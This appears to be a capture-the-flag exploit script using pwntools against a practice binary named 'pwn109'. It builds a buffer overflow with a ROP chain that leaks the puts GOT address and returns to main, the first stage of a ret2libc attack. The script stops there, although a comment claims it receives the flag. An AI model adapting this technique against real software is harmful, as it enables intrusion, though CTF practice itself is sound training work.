#!/usr/bin/python3 

from pwn import *
import re, time


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())



# Set up pwntools for the correct architecture
exe = './pwn109'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
io = start()
io.clean()

padding = 32

POP_RDI = p64(0x00000000004012a3)

payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)

write('payload', payload)
io.sendline(payload)

# Receive the flag
io.interactive()